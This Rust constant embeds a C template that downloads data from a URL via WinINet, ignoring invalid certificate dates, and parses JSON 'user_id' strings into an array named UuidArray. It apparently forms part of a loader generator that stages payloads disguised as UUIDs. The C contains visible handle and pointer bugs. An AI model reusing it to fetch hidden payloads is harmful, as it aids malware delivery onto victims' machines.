pub const WEB_C: &str = r#"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>

#include "../include/cJSON.h"

VOID DownloadFromUrl(IN LPCWSTR url, OUT PBYTE pFileContent,
                     IN SIZE_T DownloadLength) {
    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    PDWORD NumberOfBytesRead = 0;

    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    hInternetFile = InternetOpenUrlW(
        hInternet, url, NULL, NULL,
        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);

    InternetReadFile(hInternetFile, pFileContent, DownloadLength,
                     &NumberOfBytesRead);
    // clean up
    InternetCloseHandle(hInternet);
    InternetSetOptionW(hInternet, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
}

VOID ParseJsonObject(IN PBYTE WebBuffer, OUT char *UuidArray[]) {
    cJSON *root = cJSON_Parse(WebBuffer);
    cJSON *Item = cJSON_GetObjectItem(root, "user_items");
    printf("[i] Iteams Count: %d\n", cJSON_GetArraySize(Item));
    for (int i = 0; i < cJSON_GetArraySize(Item); i++) {
        printf("[i] Count: %d\n", i);
        cJSON *subitem = cJSON_GetArrayItem(Item, i);
        cJSON *users = cJSON_GetObjectItemCaseSensitive(subitem, "user_id");

        if (cJSON_IsString(users) && (users->valuestring != NULL)) {
            printf("\t[*] Users Value: %s\n", users->valuestring);
            UuidArray[i] = users->valuestring;
            // strncpy(UuidArray, users->valuestring, i);
        }
    }
}
"#;
